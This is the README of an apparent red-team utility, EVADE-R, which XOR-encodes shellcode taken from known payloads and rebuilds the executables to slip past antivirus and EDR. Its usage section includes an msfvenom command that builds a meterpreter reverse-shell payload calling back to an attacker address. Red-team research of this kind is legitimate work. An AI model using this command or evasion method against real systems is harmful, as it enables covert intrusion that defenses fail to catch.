<h1 align="center">
  🛡️ EVADE-R 🧠
</h1>

<p align="center">
  <i>Evasion Validator and Automated Decoder Engine for Red-teaming</i><br>
  <b>EVADE-R</b> is a Red Team utility that transmutes known payloads into new forms designed to slip past antivirus and EDR defenses—without breaking functionality.
</p>

---

## 🧬 What It Does

> Takes a known `.exe` payload → disassembles → obfuscates → recompiles → survives.

**EVADE-R** is an automated toolchain that:
- 💥 Accepts known malware signatures (e.g., Cobalt Strike, MSF payloads)
- 🧠 Decompiles and extracts `.text` section shellcode
- 🌀 Obfuscates shellcode via XOR encoding (and more coming)
- 🧪 Rebuilds a working `.exe` with runtime decoder stubs
- 🦠 Bypasses Windows Defender with ease

---

## 🛠️ Features

✅ Shellcode extractor  
✅ XOR encoder with randomized key  
✅ Runtime decoder stub injection  
✅ Minimal stub loader in C  
✅ Automated rebuild and output generation  
🚧 Looping & VT feedback (coming soon)  
🚧 Junk injection and instruction substitution (planned)

---

## ⚙️ Setup

### 📦 Requirements
- Arch Linux (or other distro)
- `mingw-w64-gcc` (`sudo pacman -S mingw-w64-gcc`)
- Python 3.10+
- `capstone`, `lief`, `keystone-engine`

### 🧱 One-Time Install

```bash
git clone https://github.com/YOUR_USERNAME/evade-r.git
cd evade-r
chmod +x setup.sh run.sh
./setup.sh
```
## 🚀 Usage

### 🎯 Generate a detectable payload (example)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.5.0.59 LPORT=4444 -f exe -o payload.exe
🧼 Transform it with EVADE-R

./run.sh payload.exe
```

This will:

    Extract and XOR-encode the shellcode

    Insert a runtime decoder stub

    Recompile into a new executable

You’ll find the results in:
```
artifacts/
└── payload/
    ├── EVADE_payload.exe              # Final obfuscated and rebuilt payload
    ├── obfuscated_disassembly.txt     # Human-readable disassembly with obfuscation
    └── text_section.bin               # Raw extracted .text section shellcode
``` 

##🔒 Ethical Use Only

This tool is provided strictly for ethical hacking, research, and red team training purposes.
Do not use EVADE-R on systems or networks you do not own or have explicit permission to test.

The creator assumes **no** responsibility for illegal or malicious use.


###🧙 Author


Made with blood, bytes, and broken detections by Aidan Ahern
